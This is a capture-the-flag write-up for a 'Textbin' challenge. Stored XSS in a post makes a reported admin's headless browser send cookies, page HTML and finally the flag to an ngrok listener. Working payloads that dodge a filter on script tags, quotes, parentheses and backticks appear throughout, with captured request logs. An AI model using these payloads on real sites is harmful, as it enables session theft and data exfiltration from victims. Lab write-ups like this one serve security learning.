### Challenge
```
Admin Secrets

See if you can get the flag from the admin at this website!
```

### Recon
* The Website has a
  - registration page
  - login page
  - page for creating posts
  - view list of posts
  - check separate posts --> REPORT TO ADMIN

* (Thinking about admin auth from the question) A little glance of the AUTHENTICATION and stuff had not much strength with cookies and everything.

* BUT one easy low hanging fruit to reach ADMIN here is to REPORT POST TO ADMIN

* The POSTS text box is also XSS vulnerable. Easy XSS payloads do work

### SETUP 
* Set a local web server with GET and POST and print out the PATH, HEADERS, BODY
```
import SimpleHTTPServer
import SocketServer
import urllib
class myHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def do_GET(self):
       print("--"*25)
       print(self.path)
       print(urllib.unquote(self.path))
       print(self.headers)
       print(self.address_string())
       self.send_response(301)
       new_path = '%s%s'%('http://127.0.0.1:1337/flag', self.path)
       self.send_header('Location', new_path)
       self.end_headers()

   def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        #logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
        #        str(self.path), str(self.headers), post_data.decode('utf-8'))
        print(self.path)
        print(self.headers)
        print(post_data.decode('utf-8'))
        self._set_response()
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))

PORT = 8000
handler = SocketServer.TCPServer(("", PORT), myHandler)
print("serving at port 8000")
handler.serve_forever()
```

### Solve

1. Try running a local server exposed via ngrok. XSS Payload with FETCH to check if it gets executed in ADMINs context and reaches back to us

```
<script>fetch("https://e96f25fb.ngrok.io/?c=".concat(document.cookie), {inclide: 'credentials'})</script>
```
 - Output
```
--------------------------------------------------
/?c=hint=%22Check%20the%20admin%20console!\012%22
/?c=hint="Check the admin console!\012"
Host: e96f25fb.ngrok.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.61 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:1337
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:1337/posts/vLf1vIVaAG%21ThVlB
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US
X-Forwarded-Proto: https
X-Forwarded-For: 3.83.190.219

1.0.0.127.in-addr.arpa
127.0.0.1 - - [24/May/2020 23:22:21] "GET /?c=hint=%22Check%20the%20admin%20console!\012%22 HTTP/1.1" 301 -
```
- Now we know that the admin_console runs in the local host `127.0.0.1:1337`. We can redirect and check the admin console page. There is a HINT in the cooke to check the admin console

2. One other thing to observe in the SOURCE CODE of the posts page. We can see this, one of the CSS CLASS is only visible to ADMINS. 
```
            <div class="row">
                <div class="col-8 admin_console" >
                    <!-- Only the admin can see this -->
                    
                        
                    
                </div>
            </div>
```

- Trying to get all the HEADERS and HTML of the page seen by ADMIN
HEADERS payload
```
<script>fetch("http://127.0.0.1:1337").then(function(response){var headers="";for (let [key, value] of response.headers) {headers+="/"+key+value+"/"} fetch("https://b7f9caa8.ngrok.io/?c=".concat(headers),{credentials:'include'})})</script>
```
```
/?c=/connectionclose//content-length3505//content-typetext/html;%20charset=utf-8//dateMon,%2025%20May%202020%2006:49:57%20GMT//servergunicorn/20.0.4/
/?c=/connectionclose//content-length3505//content-typetext/html; charset=utf-8//dateMon, 25 May 2020 06:49:57 GMT//servergunicorn/20.0.4/
Host: e96f25fb.ngrok.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.61 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:1337
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:1337/posts/U5dV5VfnoTVOEcw6
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US
X-Forwarded-Proto: https
X-Forwarded-For: 3.83.190.219

1.0.0.127.in-addr.arpa
127.0.0.1 - - [24/May/2020 23:49:57] "GET /?c=/connectionclose//content-length3505//content-typetext/html;%20charset=utf-8//dateMon,%2025%20May%202020%2006:49:57%20GMT//servergunicorn/20.0.4/ HTTP/1.1" 301 -
```

HTML BODY PAYLOAD in GET ( mistook the output and it came chuncked. Spent a few hours figuring things out  )
```
<script>fetch("http://127.0.0.1:1337/posts/xjrZleP%245R90h88N").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})});</script>
```
Output
```
/?c=%3C!doctype%20html%3E%3Chtml%3E%20%20%20%20%3Chead%3E%20%20%20%20%20%20%20%20%3Cmeta%20charset=%22utf-8%22%3E%20%20%20%20%20%20%20%20%3Cmeta%20name=%22viewport%22%20content=%22width=device-width,%20initial-scale=1,%20shrink-to-fit=no%22%3E%20%20%20%20%20%20%20%20%3Ctitle%3ETextbin%3C/title%3E%20%20%20%20%20%20%20%20%3Clink%20rel=%22stylesheet%22%20href=%22https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css%22%20integrity=%22sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T%22%20crossorigin=%22anonymous%22%3E%20%20%20%20%20%20%20%20%3Clink%20rel=%22stylesheet%22%20href=%22/static/css/style.css%22%3E%20%20%20%20%3C/head%3E%20%20%20%20%3Cbody%3E%20%20%20%20%20%20%20%20%3Cnav%20class=%22navbar%20navbar-expand-lg%20navbar-light%20bg-light%22%3E%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class=%22navbar-toggler%22%20type=%22button%22%20data-toggle=%22collapse%22%20data-target=%22
/?c=<!doctype html><html>    <head>        <meta charset="utf-8">        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">        <title>Textbin</title>        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">        <link rel="stylesheet" href="/static/css/style.css">    </head>    <body>        <nav class="navbar navbar-expand-lg navbar-light bg-light">          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="
Host: e96f25fb.ngrok.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.61 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:1337
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:1337/posts/2RiNxcjPu3MRi5xy
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US
X-Forwarded-Proto: https
X-Forwarded-For: 3.83.190.219

1.0.0.127.in-addr.arpa
127.0.0.1 - - [25/May/2020 00:12:55] "GET /?c=%3C!doctype%20html%3E%3Chtml%3E%20%20%20%20%3Chead%3E%20%20%20%20%20%20%20%20%3Cmeta%20charset=%22utf-8%22%3E%20%20%20%20%20%20%20%20%3Cmeta%20name=%22viewport%22%20content=%22width=device-width,%20initial-scale=1,%20shrink-to-fit=no%22%3E%20%20%20%20%20%20%20%20%3Ctitle%3ETextbin%3C/title%3E%20%20%20%20%20%20%20%20%3Clink%20rel=%22stylesheet%22%20href=%22https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css%22%20integrity=%22sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T%22%20crossorigin=%22anonymous%22%3E%20%20%20%20%20%20%20%20%3Clink%20rel=%22stylesheet%22%20href=%22/static/css/style.css%22%3E%20%20%20%20%3C/head%3E%20%20%20%20%3Cbody%3E%20%20%20%20%20%20%20%20%3Cnav%20class=%22navbar%20navbar-expand-lg%20navbar-light%20bg-light%22%3E%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class=%22navbar-toggler%22%20type=%22button%22%20data-toggle=%22collapse%22%20data-target=%22 HTTP/1.1" 301 -
```

- Getting the ADMIN_CONSOLE class items to see what the ADMIN looks at. Getting DIV class items 
```
<script>fetch("http://127.0.0.1:1337/posts/2RiNxcjPu3MRi5xy").then(response => response.text()).then(html => {return fetch("https://e96f25fb.ngrok.io/?c=".concat(document.getElementsByClassName("admin_console")[0].textContent),{credentials:'include'})});</script>
```
Output - shows admin has a way to access the flag
```
/?c=%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Access%20FlagDelete%20UserDelete%20Post
/?c=                                                                                            Access FlagDelete UserDelete Post
Host: e96f25fb.ngrok.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.61 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:1337
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:1337/posts/GoRSCwsdsZyjwByu
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US
X-Forwarded-Proto: https
X-Forwarded-For: 3.83.190.219

1.0.0.127.in-addr.arpa
127.0.0.1 - - [25/May/2020 00:16:24] "GET /?c=%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Access%20FlagDelete%20UserDelete%20Post HTTP/1.1" 301 -
```

- I realized after hours that I was getting chunked HTML of ADMIN as it was get. Switching to POST to dump the full body
```
<script>fetch("http://127.0.0.1:1337/posts/GoRSCwsdsZyjwByu").then(response => response.text()).then(html => {return fetch("https://e96f25fb.ngrok.io/?c=".concat(document.cookie),{method:'POST', credentials:'include', body: html})});</script>
```
Output shows the full html to get the flag at `/admin_flag`
```
/?c=hint=%22Check%20the%20admin%20console!\012%22
Host: e96f25fb.ngrok.io
Content-Length: 4369
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.61 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://127.0.0.1:1337
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:1337/posts/gZg3cALFJW3OUnIi
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US
X-Forwarded-Proto: https
X-Forwarded-For: 3.83.190.219

<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <title>Textbin</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
        <link rel="stylesheet" href="/static/css/style.css">
    </head>
    <body>
        <nav class="navbar navbar-expand-lg navbar-light bg-light">
          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
          </button>
          <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav">
              <li class="nav-item active">
                <a class="nav-link" href="/">Home<span class="sr-only">(current)</span></a>
              </li>
              
            </ul>
          </div>
        </nav>
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <h1>Textbin</h1>
                </div>
            </div>
            <div class="row">
                <div class="col-8 textbody">
                    
                        <script>fetch("http://127.0.0.1:1337/posts/2RiNxcjPu3MRi5xy").then(response => response.text()).then(html => {return fetch("https://e96f25fb.ngrok.io/?c=".concat(document.getElementsByClassName("admin_console")[0].textContent),{credentials:'include'})});</script>
 
                    
                </div>
            </div>
            <div class="row">
                <div class="col-8" >
                    
                        <small>By user <code>secret</code></small>
                    
                </div>
            </div>

            <div class="row" style="margin-bottom:10px">
                <div class="col-8" >
                    <button type="button" class="btn btn-warning" id="report">Report to Admin</button>
                </div>
            </div>
            <div class="row">
                <div class="col-8 admin_console" >
                    <!-- Only the admin can see this -->
                    
                        
                            <button  class="btn btn-primary flag-button">Access Flag</button>

<a href="/button" class="btn btn-primary other-button">Delete User</a>

<a href="/button" class="btn btn-primary other-button">Delete Post</a>
 
                        
                    
                </div>
            </div>
            <div id="responseAlert" class="alert alert-info" role="alert"></div>
        </div>
        <script src="https://code.jquery.com/jquery-3.3.1.min.js" crossorigin="anonymous"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
        <script>
            
            $('#responseAlert').css('display','none');
            $('#report').on('click',function(e){
                $.ajax({
                    type: "GET",
                    url: window.location.pathname+"/report",
                    success: function(resp) {
                        $("#responseAlert").text(resp); $("#responseAlert").css("display","");
                    }
                })
            });
            

                var flag='';
                f=function(e){

                    $.ajax({
                        type: "GET",
                        url: "/admin_flag",
                        success: function(resp) {
                            flag=resp;$("#responseAlert").text(resp); $("#responseAlert").css("display","");
                        }
                    })
                    return flag;
                };
                $('.flag-button').on('click',f);
            

             
        </script>
    </body>
</html>
--------------
```

3.  OK, Now we know what to get. From ADMINs context with XSS we fetch `/admin_flag` and return the contents to US or our C&C server. Sounds easy but there is a catch, there is a XSS filter to evade.....
```
<script>fetch("http://127.0.0.1:1337/admin_flag").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})});</script>
```
Output shows filter results
```
/?c=This%20post%20contains%20unsafe%20content.%20To%20prevent%20unauthorized%20access,%20the%20flag%20cannot%20be%20accessed%20for%20the%20following%20violations:%20Script%20tags%20found.%20Single%20quote%20found.%20Double%20quote%20found.%20Parenthesis%20found.
/?c=This post contains unsafe content. To prevent unauthorized access, the flag cannot be accessed for the following violations: Script tags found. Single quote found. Double quote found. Parenthesis found.
Host: e96f25fb.ngrok.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.61 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:1337
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:1337/posts/%21ulbjiWx%21OObjLFP
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US
X-Forwarded-Proto: https
X-Forwarded-For: 3.83.190.219

1.0.0.127.in-addr.arpa
127.0.0.1 - - [25/May/2020 00:18:50] "GET /?c=This%20post%20contains%20unsafe%20content.%20To%20prevent%20unauthorized%20access,%20the%20flag%20cannot%20be%20accessed%20for%20the%20following%20violations:%20Script%20tags%20found.%20Single%20quote%20found.%20Double%20quote%20found.%20Parenthesis%20found. HTTP/1.1" 301 -
```

- Blah, XSS fiter is in place. We need to evade the XSS filter now. For a moment I thought I could evade the filter by altering the referer header so the page does not see the tags or xss payload. Did not work!!!
```
<script>fetch("http://127.0.0.1:1337/admin_flag",{method: 'POST', headers: {'Referer', 'http://127.0.0.1:1337/posts/77tOfu7nFG5MvySD'}}).then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text),{credentials:'include'})})});</script>
```

4. Evading SCRIPT tag ( even the javascript tag does not work )
```
<BODY ONLOAD='(function(){return fetch("http://127.0.0.1:1337/admin_flag").then(function(response){response.text().then(function (text) {return fetch("https://e96f25fb.ngrok.io/?c=".concat(text))})})})(this)'>
```

```
/?c=This post contains unsafe content. To prevent unauthorized access, the flag cannot be accessed for the following violations: Single quote found. Double quote found. Parenthesis found.
```

5. Evading double quotes
```
<BODY ONLOAD='(function(){return fetch(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103)).then(function(response){response.text().then(function (text) {return fetch(String.fromCharCode(104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61)+text)})})})(this)'>
```
```
/?c=This post contains unsafe content. To prevent unauthorized access, the flag cannot be accessed for the following violations: Single quote found. Parenthesis found.
```

6. Evading single quotes by using backticks
7. Evading brackets
```
<BODY ONLOAD=setInterval`\x28function\x28\x29{fetch\x28String.fromCharCode\x28104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103\x29\x29.then\x28function\x28response\x29{response.text\x28\x29.then\x28function\x28text\x29{fetch\x28String.fromCharCode\x28104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61\x29+text\x29}\x29}\x29}\x29\x28this\x29`>
```
Output - I thought I evaded everything to end up at BACKTICK only again
```
/?c=This post contains unsafe content. To prevent unauthorized access, the flag cannot be accessed for the following violations: Backtick found.
```

8. Evading backtick by replacing with `&#96` and setInterval or setTimeout
9.  Flag Finally!

Payload
```
<BODY ONLOAD=setInterval&#96\x28function\x28\x29{fetch\x28String.fromCharCode\x28104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,51,51,55,47,97,100,109,105,110,95,102,108,97,103\x29\x29.then\x28function\x28response\x29{response.text\x28\x29.then\x28function\x28text\x29{fetch\x28String.fromCharCode\x28104,116,116,112,115,58,47,47,101,57,54,102,50,53,102,98,46,110,103,114,111,107,46,105,111,47,63,99,61\x29+text\x29}\x29}\x29}\x29\x28this\x29&#96>
```

Output
```
/?c=tjctf{st0p_st3aling_th3_ADm1ns_fl4gs}
/?c=tjctf{st0p_st3aling_th3_ADm1ns_fl4gs}
Host: e96f25fb.ngrok.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.61 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:1337
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:1337/posts/D3Lkj1pQ18xOgMGE
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US
X-Forwarded-Proto: https
X-Forwarded-For: 3.83.190.219

1.0.0.127.in-addr.arpa
127.0.0.1 - - [24/May/2020 22:14:06] "GET /?c=tjctf{st0p_st3aling_th3_ADm1ns_fl4gs} HTTP/1.1" 301 -
```

### References
```
* https://www.blackhat.com/docs/eu-14/materials/eu-14-Javed-Revisiting-XSS-Sanitization-wp.pdf
* https://null-byte.wonderhowto.com/how-to/advanced-techniques-bypass-defeat-xss-filters-part-1-0190257/
* https://stackoverflow.com/questions/27678052/usage-of-the-backtick-character-in-javascript
* http://cubalo.github.io/blog/2014/01/04/bypassing-xss-filters-using-data-uris/
* https://security.stackexchange.com/questions/173032/xss-payload-without
* https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-html
* https://brutelogic.com.br/blog/quoteless-javascript-injections/
* https://davidmurdoch.com/2017/09/02/the-grave-accent-and-xss/
* https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
* https://github.com/s0md3v/AwesomeXSS#awesome-payloads
* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
* https://owasp.org/www-community/xss-filter-evasion-cheatsheet
* https://xsses.rocks/sample-page/
* https://stackoverflow.com/questions/4342124/inline-event-handlers-and-anonymous-functions
* https://portswigger.net/research/xss-without-parentheses-and-semi-colons
* https://security.stackexchange.com/questions/71317/stored-cross-site-scripting-without-parentheses-or-spaces
* https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any
```